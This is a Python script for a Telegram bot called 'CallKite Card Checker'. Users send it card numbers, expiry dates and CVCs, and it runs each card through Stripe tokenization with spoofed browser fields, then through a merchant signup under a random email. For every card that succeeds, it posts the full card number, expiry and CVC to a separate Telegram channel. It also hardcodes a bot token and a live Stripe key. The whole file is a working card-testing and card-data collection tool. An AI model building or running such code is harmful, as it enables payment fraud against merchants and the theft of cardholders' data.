import telebot
import requests
import random
import string

BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_aS5XfyascG0bAVDXZDAZdX4j"

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
        return None
    return card_number, exp_month.zfill(2), exp_year, cvc

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 CallKite Card Checker\n"
        "Send card details in one of these formats:\n"
        "CardNumber|MM|YY|CVC\n"
        "CardNumber|MM|YYYY|CVC\n"
        "Example:\n5275150097242499|09|28|575"
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        parsed = parse_card_input(message.text)
        if not parsed:
            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")

        card_number, exp_month, exp_year, cvc = parsed
        if len(exp_year) == 2:
            exp_year = "20" + exp_year

        email = generate_random_email()
        plan = "monthly"

        stripe_data = {
            "card[number]": card_number,
            "card[cvc]": cvc,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://callkite.com",
            "key": STRIPE_PUBLISHABLE_KEY
        }

        stripe_resp = requests.post(
            "https://api.stripe.com/v1/tokens",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()

        if "error" in stripe_json:
            return bot.reply_to(message, f"❌ Stripe Decline:\n{stripe_json['error'].get('message', 'Unknown error')}")

        token = stripe_json.get("id")
        if not token or not token.startswith("tok_"):
            return bot.reply_to(message, f"❌ Failed to get Stripe token:\n{stripe_json}")

        signup_payload = {
            "email": email,
            "token": token,
            "plan": plan
        }
        signup_resp = requests.post(
            "https://callkite.com/api/signup",
            json=signup_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://callkite.com",
                "referer": "https://callkite.com/signup"
            }
        )
        signup_json = signup_resp.json()

        if signup_json.get("success") is True:
            subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
            success_msg = (
                f"✅ Payment Successful!\n\n"
                f"Card Details:\n"
                f"Number: {card_number}\n"
                f"Expiry: {exp_month}/{exp_year}\n"
                f"CVC: {cvc}\n\n"
                f"Subscription ID: {subscription_id}\n"
                f"Email used: {email}\n\n"
                f"Full Response:\n{signup_json}"
            )
            bot.reply_to(message, "✅ Your Card Was Added")
            bot.send_message(CHANNEL_ID, success_msg)
        else:
            bot.reply_to(message, f"❌ Decline or Error:\n{signup_json.get('message', 'Unknown error')}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()